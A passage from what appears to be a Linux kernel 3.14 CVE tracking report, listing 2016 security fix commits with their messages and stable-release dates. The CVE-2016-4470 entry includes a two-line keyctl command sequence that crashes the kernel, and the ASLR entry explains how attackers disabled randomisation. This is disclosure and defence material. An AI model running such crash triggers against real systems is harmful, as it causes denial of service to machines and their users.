commit 8835ba4a39cf53f705417b3b3a94eb067673f2c9
Author: Oliver Neukum <oneukum@suse.com>
Date:   Tue Mar 15 10:14:04 2016 +0100

    USB: cdc-acm: more sanity checking
    
    An attack has become available which pretends to be a quirky
    device circumventing normal sanity checks and crashes the kernel
    by an insufficient number of interfaces. This patch adds a check
    to the code path for quirky devices.
    
    Signed-off-by: Oliver Neukum <ONeukum@suse.com>
    CC: stable@vger.kernel.org
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/class/cdc-acm.c |    3 +++
 1 file changed, 3 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3138
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-18
Linus Commit: 8835ba4a39cf53f705417b3b3a94eb067673f2c9
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 180aa6e45eb471aec123854df40d787c634943eb
Stable Tag: 3.14.66

CVE-2016-3140:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f
Author: Oliver Neukum <oneukum@suse.com>
Date:   Thu Mar 31 12:04:26 2016 -0400

    USB: digi_acceleport: do sanity checking for the number of ports
    
    The driver can be crashed with devices that expose crafted descriptors
    with too few endpoints.
    
    See: http://seclists.org/bugtraq/2016/Mar/61
    
    Signed-off-by: Oliver Neukum <ONeukum@suse.com>
    [johan: fix OOB endpoint check and add error messages ]
    Cc: stable <stable@vger.kernel.org>
    Signed-off-by: Johan Hovold <johan@kernel.org>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/serial/digi_acceleport.c |   19 +++++++++++++++++++
 1 file changed, 19 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3140
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-31
Linus Commit: 5a07975ad0a36708c6b0a5b9fea1ff811d0b0c1f
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 91c4c149606657236e4a735778c7ca632e92bcd4
Stable Tag: 3.14.66

CVE-2016-3156:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit fbd40ea0180a2d328c5adc61414dc8bab9335ce2
Author: David S. Miller <davem@davemloft.net>
Date:   Sun Mar 13 23:28:00 2016 -0400

    ipv4: Don't do expensive useless work during inetdev destroy.
    
    When an inetdev is destroyed, every address assigned to the interface
    is removed.  And in this scenerio we do two pointless things which can
    be very expensive if the number of assigned interfaces is large:
    
    1) Address promotion.  We are deleting all addresses, so there is no
       point in doing this.
    
    2) A full nf conntrack table purge for every address.  We only need to
       do this once, as is already caught by the existing
       masq_dev_notifier so masq_inet_event() can skip this.
    
    Reported-by: Solar Designer <solar@openwall.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>
    Tested-by: Cyrill Gorcunov <gorcunov@openvz.org>

 net/ipv4/devinet.c                          |    4 ++++
 net/ipv4/fib_frontend.c                     |    4 ++++
 net/ipv4/netfilter/nf_nat_masquerade_ipv4.c |   12 ++++++++++--
 3 files changed, 18 insertions(+), 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3156
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-13
Linus Commit: fbd40ea0180a2d328c5adc61414dc8bab9335ce2
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-3157:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.68.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b7a584598aea7ca73140cb87b40319944dd3393f
Author: Andy Lutomirski <luto@kernel.org>
Date:   Wed Mar 16 14:14:21 2016 -0700

    x86/iopl/64: Properly context-switch IOPL on Xen PV
    
    On Xen PV, regs->flags doesn't reliably reflect IOPL and the
    exit-to-userspace code doesn't change IOPL.  We need to context
    switch it manually.
    
    I'm doing this without going through paravirt because this is
    specific to Xen PV.  After the dust settles, we can merge this with
    the 32-bit code, tidy up the iopl syscall implementation, and remove
    the set_iopl pvop entirely.
    
    Fixes XSA-171.
    
    Reviewewd-by: Jan Beulich <JBeulich@suse.com>
    Signed-off-by: Andy Lutomirski <luto@kernel.org>
    Cc: Andrew Cooper <andrew.cooper3@citrix.com>
    Cc: Andy Lutomirski <luto@amacapital.net>
    Cc: Boris Ostrovsky <boris.ostrovsky@oracle.com>
    Cc: Borislav Petkov <bp@alien8.de>
    Cc: Brian Gerst <brgerst@gmail.com>
    Cc: David Vrabel <david.vrabel@citrix.com>
    Cc: Denys Vlasenko <dvlasenk@redhat.com>
    Cc: H. Peter Anvin <hpa@zytor.com>
    Cc: Jan Beulich <JBeulich@suse.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: stable@vger.kernel.org
    Link: http://lkml.kernel.org/r/693c3bd7aeb4d3c27c92c622b7d0f554a458173c.1458162709.git.luto@kernel.org
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/include/asm/xen/hypervisor.h |    2 ++
 arch/x86/kernel/process_64.c          |   12 ++++++++++++
 arch/x86/xen/enlighten.c              |    2 +-
 3 files changed, 15 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-12
CVE: CVE-2016-3157
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-17
Linus Commit: b7a584598aea7ca73140cb87b40319944dd3393f
Linus Tag: 4.6
Stable Date: 2016-05-04
Stable Commit: c216658f5fda233ae3c27f8fbfe3b2498ebe75ab
Stable Tag: 3.14.68

CVE-2016-3672:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 8b8addf891de8a00e4d39fc32f93f7c5eb8feceb
Author: Hector Marco-Gisbert <hecmargi@upv.es>
Date:   Thu Mar 10 20:51:00 2016 +0100

    x86/mm/32: Enable full randomization on i386 and X86_32
    
    Currently on i386 and on X86_64 when emulating X86_32 in legacy mode, only
    the stack and the executable are randomized but not other mmapped files
    (libraries, vDSO, etc.). This patch enables randomization for the
    libraries, vDSO and mmap requests on i386 and in X86_32 in legacy mode.
    
    By default on i386 there are 8 bits for the randomization of the libraries,
    vDSO and mmaps which only uses 1MB of VA.
    
    This patch preserves the original randomness, using 1MB of VA out of 3GB or
    4GB. We think that 1MB out of 3GB is not a big cost for having the ASLR.
    
    The first obvious security benefit is that all objects are randomized (not
    only the stack and the executable) in legacy mode which highly increases
    the ASLR effectiveness, otherwise the attackers may use these
    non-randomized areas. But also sensitive setuid/setgid applications are
    more secure because currently, attackers can disable the randomization of
    these applications by setting the ulimit stack to "unlimited". This is a
    very old and widely known trick to disable the ASLR in i386 which has been
    allowed for too long.
    
    Another trick used to disable the ASLR was to set the ADDR_NO_RANDOMIZE
    personality flag, but fortunately this doesn't work on setuid/setgid
    applications because there is security checks which clear Security-relevant
    flags.
    
    This patch always randomizes the mmap_legacy_base address, removing the
    possibility to disable the ASLR by setting the stack to "unlimited".
    
    Signed-off-by: Hector Marco-Gisbert <hecmargi@upv.es>
    Acked-by: Ismael Ripoll Ripoll <iripoll@upv.es>
    Acked-by: Kees Cook <keescook@chromium.org>
    Acked-by: Arjan van de Ven <arjan@linux.intel.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: akpm@linux-foundation.org
    Cc: kees Cook <keescook@chromium.org>
    Link: http://lkml.kernel.org/r/1457639460-5242-1-git-send-email-hecmargi@upv.es
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/mm/mmap.c |   14 +-------------
 1 file changed, 1 insertion(+), 13 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-27
CVE: CVE-2016-3672
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-11
Linus Commit: 8b8addf891de8a00e4d39fc32f93f7c5eb8feceb
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-3689:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.66.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff
Author: Oliver Neukum <oneukum@suse.com>
Date:   Thu Mar 17 14:00:17 2016 -0700

    Input: ims-pcu - sanity check against missing interfaces
    
    A malicious device missing interface can make the driver oops.
    Add sanity checking.
    
    Signed-off-by: Oliver Neukum <ONeukum@suse.com>
    CC: stable@vger.kernel.org
    Signed-off-by: Dmitry Torokhov <dmitry.torokhov@gmail.com>

 drivers/input/misc/ims-pcu.c |    4 ++++
 1 file changed, 4 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3689
Break Date: 2013-03-12
Break Commit: 628329d52474323938a03826941e166bc7c8eff4
Break Tag: 4.6
Linus Fix Date: 2016-03-17
Linus Commit: a0ad220c96692eda76b2e3fd7279f3dcd1d8a8ff
Linus Tag: 4.6
Stable Date: 2016-04-12
Stable Commit: 665bbcb66051e1176a159d270e53d439f9dc8c80
Stable Tag: 3.14.66

CVE-2016-3713:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 9842df62004f366b9fed2423e24df10542ee0dc5
Author: Andy Honig <ahonig@google.com>
Date:   Tue May 17 17:41:47 2016 +0200

    KVM: MTRR: remove MSR 0x2f8
    
    MSR 0x2f8 accessed the 124th Variable Range MTRR ever since MTRR support
    was introduced by 9ba075a664df ("KVM: MTRR support").
    
    0x2f8 became harmful when 910a6aae4e2e ("KVM: MTRR: exactly define the
    size of variable MTRRs") shrinked the array of VR MTRRs from 256 to 8,
    which made access to index 124 out of bounds.  The surrounding code only
    WARNs in this situation, thus the guest gained a limited read/write
    access to struct kvm_arch_vcpu.
    
    0x2f8 is not a valid VR MTRR MSR, because KVM has/advertises only 16 VR
    MTRR MSRs, 0x200-0x20f.  Every VR MTRR is set up using two MSRs, 0x2f8
    was treated as a PHYSBASE and 0x2f9 would be its PHYSMASK, but 0x2f9 was
    not implemented in KVM, therefore 0x2f8 could never do anything useful
    and getting rid of it is safe.
    
    This fixes CVE-2016-3713.
    
    Fixes: 910a6aae4e2e ("KVM: MTRR: exactly define the size of variable MTRRs")
    Cc: stable@vger.kernel.org
    Reported-by: David Matlack <dmatlack@google.com>
    Signed-off-by: Andy Honig <ahonig@google.com>
    Signed-off-by: Radim Krm <rkrcmar@redhat.com>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/mtrr.c |    2 --
 1 file changed, 2 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-3713
Break Date: 2015-06-19
Break Commit: 910a6aae4e2e45855efc4a268e43eed2d8445575
Break Tag: 4.2
Linus Fix Date: 2016-05-18
Linus Commit: 9842df62004f366b9fed2423e24df10542ee0dc5
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-3841:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 45f6fad84cc305103b28d73482b344d7f5b76f39
Author: Eric Dumazet <edumazet@google.com>
Date:   Sun Nov 29 19:37:57 2015 -0800

    ipv6: add complete rcu protection around np->opt
    
    This patch addresses multiple problems :
    
    UDP/RAW sendmsg() need to get a stable struct ipv6_txoptions
    while socket is not locked : Other threads can change np->opt
    concurrently. Dmitry posted a syzkaller
    (http://github.com/google/syzkaller) program desmonstrating
    use-after-free.
    
    Starting with TCP/DCCP lockless listeners, tcp_v6_syn_recv_sock()
    and dccp_v6_request_recv_sock() also need to use RCU protection
    to dereference np->opt once (before calling ipv6_dup_options())
    
    This patch adds full RCU protection to np->opt
    
    Reported-by: Dmitry Vyukov <dvyukov@google.com>
    Signed-off-by: Eric Dumazet <edumazet@google.com>
    Acked-by: Hannes Frederic Sowa <hannes@stressinduktion.org>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 include/linux/ipv6.h             |    2 +-
 include/net/ipv6.h               |   21 ++++++++++++++++++++-
 net/dccp/ipv6.c                  |   33 +++++++++++++++++++++------------
 net/ipv6/af_inet6.c              |   13 +++++++++----
 net/ipv6/datagram.c              |    4 +++-
 net/ipv6/exthdrs.c               |    3 ++-
 net/ipv6/inet6_connection_sock.c |   11 ++++++++---
 net/ipv6/ipv6_sockglue.c         |   33 ++++++++++++++++++++++-----------
 net/ipv6/raw.c                   |    8 ++++++--
 net/ipv6/syncookies.c            |    2 +-
 net/ipv6/tcp_ipv6.c              |   28 +++++++++++++++++-----------
 net/ipv6/udp.c                   |    8 ++++++--
 net/l2tp/l2tp_ip6.c              |    8 ++++++--
 13 files changed, 122 insertions(+), 52 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-06
CVE: CVE-2016-3841
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2015-12-02
Linus Commit: 45f6fad84cc305103b28d73482b344d7f5b76f39
Linus Tag: 4.4
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-3857:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 7de249964f5578e67b99699c5f0b405738d820a2
Author: Dave Weinstein <olorin@google.com>
Date:   Thu Jul 28 11:55:41 2016 -0700

    arm: oabi compat: add missing access checks
    
    Add access checks to sys_oabi_epoll_wait() and sys_oabi_semtimedop().
    This fixes CVE-2016-3857, a local privilege escalation under
    CONFIG_OABI_COMPAT.
    
    Cc: stable@vger.kernel.org
    Reported-by: Chiachih Wu <wuchiachih@gmail.com>
    Reviewed-by: Kees Cook <keescook@chromium.org>
    Reviewed-by: Nicolas Pitre <nico@linaro.org>
    Signed-off-by: Dave Weinstein <olorin@google.com>
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 arch/arm/kernel/sys_oabi-compat.c |    8 +++++++-
 1 file changed, 7 insertions(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-08-05
CVE: CVE-2016-3857
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-08-10
Linus Commit: 7de249964f5578e67b99699c5f0b405738d820a2
Linus Tag: 4.8
Stable Date: 2016-08-16
Stable Commit: e380a2712ff17b87a0fee55143862c998098144c
Stable Tag: 3.14.76

CVE-2016-3951:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.67.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 1666984c8625b3db19a9abc298931d35ab7bc64b
Author: Oliver Neukum <oneukum@suse.com>
Date:   Mon Mar 7 11:31:10 2016 +0100

    usbnet: cleanup after bind() in probe()
    
    In case bind() works, but a later error forces bailing
    in probe() in error cases work and a timer may be scheduled.
    They must be killed. This fixes an error case related to
    the double free reported in
    http://www.spinics.net/lists/netdev/msg367669.html
    and needs to go on top of Linus' fix to cdc-ncm.
    
    Signed-off-by: Oliver Neukum <ONeukum@suse.com>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/net/usb/usbnet.c |    7 +++++++
 1 file changed, 7 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3951
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-07
Linus Commit: 1666984c8625b3db19a9abc298931d35ab7bc64b
Linus Tag: 4.5
Stable Date: 2016-04-20
Stable Commit: 7f3216bee081816d415566a86a5bd3fcf2d5dcd7
Stable Tag: 3.14.67

CVE-2016-3951:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.76.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 4d06dd537f95683aba3651098ae288b7cbff8274
Author: Bjrn Mork <bjorn@mork.no>
Date:   Mon Mar 7 21:15:36 2016 +0100

    cdc_ncm: do not call usbnet_link_change from cdc_ncm_bind
    
    usbnet_link_change will call schedule_work and should be
    avoided if bind is failing. Otherwise we will end up with
    scheduled work referring to a netdev which has gone away.
    
    Instead of making the call conditional, we can just defer
    it to usbnet_probe, using the driver_info flag made for
    this purpose.
    
    Fixes: 8a34b0ae8778 ("usbnet: cdc_ncm: apply usbnet_link_change")
    Reported-by: Andrey Konovalov <andreyknvl@gmail.com>
    Suggested-by: Linus Torvalds <torvalds@linux-foundation.org>
    Signed-off-by: Bjrn Mork <bjorn@mork.no>
    Signed-off-by: David S. Miller <davem@davemloft.net>

 drivers/net/usb/cdc_ncm.c |   20 +++++---------------
 1 file changed, 5 insertions(+), 15 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-05-02
CVE: CVE-2016-3951
Break Date: 2013-04-11
Break Commit: 8a34b0ae8778f6b42ed38857486b769a224e2536
Break Tag: 3.10
Linus Fix Date: 2016-03-07
Linus Commit: 4d06dd537f95683aba3651098ae288b7cbff8274
Linus Tag: 4.5
Stable Date: 2016-08-16
Stable Commit: 0c17e10854221a4b59bb0266f60cac96f2ad225a
Stable Tag: 3.14.76

CVE-2016-3955:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.68.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb
Author: Ignat Korchagin <ignat.korchagin@gmail.com>
Date:   Thu Mar 17 18:00:29 2016 +0000

    USB: usbip: fix potential out-of-bounds write
    
    Fix potential out-of-bounds write to urb->transfer_buffer
    usbip handles network communication directly in the kernel. When receiving a
    packet from its peer, usbip code parses headers according to protocol. As
    part of this parsing urb->actual_length is filled. Since the input for
    urb->actual_length comes from the network, it should be treated as untrusted.
    Any entity controlling the network may put any value in the input and the
    preallocated urb->transfer_buffer may not be large enough to hold the data.
    Thus, the malicious entity is able to write arbitrary data to kernel memory.
    
    Signed-off-by: Ignat Korchagin <ignat.korchagin@gmail.com>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/usbip/usbip_common.c |   11 +++++++++++
 1 file changed, 11 insertions(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-07-03
CVE: CVE-2016-3955
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-03-30
Linus Commit: b348d7dddb6c4fbfc810b7a0626e8ec9e29f7cbb
Linus Tag: 4.6
Stable Date: 2016-05-04
Stable Commit: c9104ee05af3ecb2943872287da3d576b145c55f
Stable Tag: 3.14.68

CVE-2016-3961:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 103f6112f253017d7062cd74d17f4a514ed4485c
Author: Jan Beulich <JBeulich@suse.com>
Date:   Thu Apr 21 00:27:04 2016 -0600

    x86/mm/xen: Suppress hugetlbfs in PV guests
    
    Huge pages are not normally available to PV guests. Not suppressing
    hugetlbfs use results in an endless loop of page faults when user mode
    code tries to access a hugetlbfs mapped area (since the hypervisor
    denies such PTEs to be created, but error indications can't be
    propagated out of xen_set_pte_at(), just like for various of its
    siblings), and - once killed in an oops like this:
    
      kernel BUG at .../fs/hugetlbfs/inode.c:428!
      invalid opcode: 0000 [#1] SMP
      ...
      RIP: e030:[<ffffffff811c333b>]  [<ffffffff811c333b>] remove_inode_hugepages+0x25b/0x320
      ...
      Call Trace:
       [<ffffffff811c3415>] hugetlbfs_evict_inode+0x15/0x40
       [<ffffffff81167b3d>] evict+0xbd/0x1b0
       [<ffffffff8116514a>] __dentry_kill+0x19a/0x1f0
       [<ffffffff81165b0e>] dput+0x1fe/0x220
       [<ffffffff81150535>] __fput+0x155/0x200
       [<ffffffff81079fc0>] task_work_run+0x60/0xa0
       [<ffffffff81063510>] do_exit+0x160/0x400
       [<ffffffff810637eb>] do_group_exit+0x3b/0xa0
       [<ffffffff8106e8bd>] get_signal+0x1ed/0x470
       [<ffffffff8100f854>] do_signal+0x14/0x110
       [<ffffffff810030e9>] prepare_exit_to_usermode+0xe9/0xf0
       [<ffffffff814178a5>] retint_user+0x8/0x13
    
    This is CVE-2016-3961 / XSA-174.
    
    Reported-by: Vitaly Kuznetsov <vkuznets@redhat.com>
    Signed-off-by: Jan Beulich <jbeulich@suse.com>
    Cc: Andrew Morton <akpm@linux-foundation.org>
    Cc: Andy Lutomirski <luto@amacapital.net>
    Cc: Boris Ostrovsky <boris.ostrovsky@oracle.com>
    Cc: Borislav Petkov <bp@alien8.de>
    Cc: Brian Gerst <brgerst@gmail.com>
    Cc: David Vrabel <david.vrabel@citrix.com>
    Cc: Denys Vlasenko <dvlasenk@redhat.com>
    Cc: H. Peter Anvin <hpa@zytor.com>
    Cc: Juergen Gross <JGross@suse.com>
    Cc: Linus Torvalds <torvalds@linux-foundation.org>
    Cc: Luis R. Rodriguez <mcgrof@suse.com>
    Cc: Peter Zijlstra <peterz@infradead.org>
    Cc: Thomas Gleixner <tglx@linutronix.de>
    Cc: Toshi Kani <toshi.kani@hp.com>
    Cc: stable@vger.kernel.org
    Cc: xen-devel <xen-devel@lists.xenproject.org>
    Link: http://lkml.kernel.org/r/57188ED802000078000E431C@prv-mh.provo.novell.com
    Signed-off-by: Ingo Molnar <mingo@kernel.org>

 arch/x86/include/asm/hugetlb.h |    1 +
 1 file changed, 1 insertion(+)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-04-15
CVE: CVE-2016-3961
Break Date: -
Break Commit: -
Break Tag: -
Linus Fix Date: 2016-04-22
Linus Commit: 103f6112f253017d7062cd74d17f4a514ed4485c
Linus Tag: 4.6
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4440:
*************

*** This is a new CVE ***
---
Description of fix for this vulnerability:
commit 3ce424e45411cf5a13105e0386b6ecf6eeb4f66f
Author: Roman Kagan <rkagan@virtuozzo.com>
Date:   Wed May 18 17:48:20 2016 +0300

    kvm:vmx: more complete state update on APICv on/off
    
    The function to update APICv on/off state (in particular, to deactivate
    it when enabling Hyper-V SynIC) is incomplete: it doesn't adjust
    APICv-related fields among secondary processor-based VM-execution
    controls.  As a result, Windows 2012 guests get stuck when SynIC-based
    auto-EOI interrupt intersected with e.g. an IPI in the guest.
    
    In addition, the MSR intercept bitmap isn't updated every time "virtualize
    x2APIC mode" is toggled.  This path can only be triggered by a malicious
    guest, because Windows didn't use x2APIC but rather their own synthetic
    APIC access MSRs; however a guest running in a SynIC-enabled VM could
    switch to x2APIC and thus obtain direct access to host APIC MSRs
    (CVE-2016-4440).
    
    The patch fixes those omissions.
    
    Signed-off-by: Roman Kagan <rkagan@virtuozzo.com>
    Reported-by: Steve Rutherford <srutherford@google.com>
    Reported-by: Yang Zhang <yang.zhang.wz@gmail.com>
    Signed-off-by: Paolo Bonzini <pbonzini@redhat.com>

 arch/x86/kvm/vmx.c |   48 ++++++++++++++++++++++++++++++------------------
 1 file changed, 30 insertions(+), 18 deletions(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-4440
Break Date: 2015-11-25
Break Commit: 5c919412fe61c35947816fdbd5f7bd09fe0dd073
Break Tag: 4.5
Linus Fix Date: 2016-05-25
Linus Commit: 3ce424e45411cf5a13105e0386b6ecf6eeb4f66f
Linus Tag: 4.7
Stable Date: -
Stable Commit: -
Stable Tag: -

CVE-2016-4470:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.74.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 38327424b40bcebe2de92d07312c89360ac9229a
Author: Dan Carpenter <dan.carpenter@oracle.com>
Date:   Thu Jun 16 15:48:57 2016 +0100

    KEYS: potential uninitialized variable
    
    If __key_link_begin() failed then "edit" would be uninitialized.  I've
    added a check to fix that.
    
    This allows a random user to crash the kernel, though it's quite
    difficult to achieve.  There are three ways it can be done as the user
    would have to cause an error to occur in __key_link():
    
     (1) Cause the kernel to run out of memory.  In practice, this is difficult
         to achieve without ENOMEM cropping up elsewhere and aborting the
         attempt.
    
     (2) Revoke the destination keyring between the keyring ID being looked up
         and it being tested for revocation.  In practice, this is difficult to
         time correctly because the KEYCTL_REJECT function can only be used
         from the request-key upcall process.  Further, users can only make use
         of what's in /sbin/request-key.conf, though this does including a
         rejection debugging test - which means that the destination keyring
         has to be the caller's session keyring in practice.
    
     (3) Have just enough key quota available to create a key, a new session
         keyring for the upcall and a link in the session keyring, but not then
         sufficient quota to create a link in the nominated destination keyring
         so that it fails with EDQUOT.
    
    The bug can be triggered using option (3) above using something like the
    following:
    
    	echo 80 >/proc/sys/kernel/keys/root_maxbytes
    	keyctl request2 user debug:fred negate @t
    
    The above sets the quota to something much lower (80) to make the bug
    easier to trigger, but this is dependent on the system.  Note also that
    the name of the keyring created contains a random number that may be
    between 1 and 10 characters in size, so may throw the test off by
    changing the amount of quota used.
    
    Assuming the failure occurs, something like the following will be seen:
    
    	kfree_debugcheck: out of range ptr 6b6b6b6b6b6b6b68h
    	------------[ cut here ]------------
    	kernel BUG at ../mm/slab.c:2821!
    	...
    	RIP: 0010:[<ffffffff811600f9>] kfree_debugcheck+0x20/0x25
    	RSP: 0018:ffff8804014a7de8  EFLAGS: 00010092
    	RAX: 0000000000000034 RBX: 6b6b6b6b6b6b6b68 RCX: 0000000000000000
    	RDX: 0000000000040001 RSI: 00000000000000f6 RDI: 0000000000000300
    	RBP: ffff8804014a7df0 R08: 0000000000000001 R09: 0000000000000000
    	R10: ffff8804014a7e68 R11: 0000000000000054 R12: 0000000000000202
    	R13: ffffffff81318a66 R14: 0000000000000000 R15: 0000000000000001
    	...
    	Call Trace:
    	  kfree+0xde/0x1bc
    	  assoc_array_cancel_edit+0x1f/0x36
    	  __key_link_end+0x55/0x63
    	  key_reject_and_link+0x124/0x155
    	  keyctl_reject_key+0xb6/0xe0
    	  keyctl_negate_key+0x10/0x12
    	  SyS_keyctl+0x9f/0xe7
    	  do_syscall_64+0x63/0x13a
    	  entry_SYSCALL64_slow_path+0x25/0x25
    
    Fixes: f70e2e06196a ('KEYS: Do preallocation for __key_link()')
    Signed-off-by: Dan Carpenter <dan.carpenter@oracle.com>
    Signed-off-by: David Howells <dhowells@redhat.com>
    cc: stable@vger.kernel.org
    Signed-off-by: Linus Torvalds <torvalds@linux-foundation.org>

 security/keys/key.c |    2 +-
 1 file changed, 1 insertion(+), 1 deletion(-)
---
The following fields have changed: Public Date,CVE,Break Date,Break Commit,Break Tag,Linus Fix Date,Linus Commit,Linus Tag,Stable Date,Stable Commit,Stable Tag
Public Date: 2016-06-27
CVE: CVE-2016-4470
Break Date: 2010-05-06
Break Commit: f70e2e06196ad4c1c762037da2f75354f6c16b81
Break Tag: 2.6
Linus Fix Date: 2016-06-16
Linus Commit: 38327424b40bcebe2de92d07312c89360ac9229a
Linus Tag: 4.7
Stable Date: 2016-07-27
Stable Commit: ff1dcd2a19f8203324cba737a54707a1ee3f98ea
Stable Tag: 3.14.74

CVE-2016-4482:
*************

*** This is a new CVE ***
This CVE has been resolved in 3.14.77.
Please pull this or a newer version of the kernel to resolve this security vulnerability.

---
Description of fix for this vulnerability:
commit 681fef8380eb818c0b845fca5d2ab1dcbab114ee
Author: Kangjie Lu <kangjielu@gmail.com>
Date:   Tue May 3 16:32:16 2016 -0400

    USB: usbfs: fix potential infoleak in devio
    
    The stack object ci has a total size of 8 bytes. Its last 3 bytes
    are padding bytes which are not initialized and leaked to userland
    via copy_to_user.
    
    Signed-off-by: Kangjie Lu <kjlu@gatech.edu>
    Signed-off-by: Greg Kroah-Hartman <gregkh@linuxfoundation.org>

 drivers/usb/core/devio.c |    9 +++++----
 1 file changed, 5 insertions(+), 4 deletions(-)
---
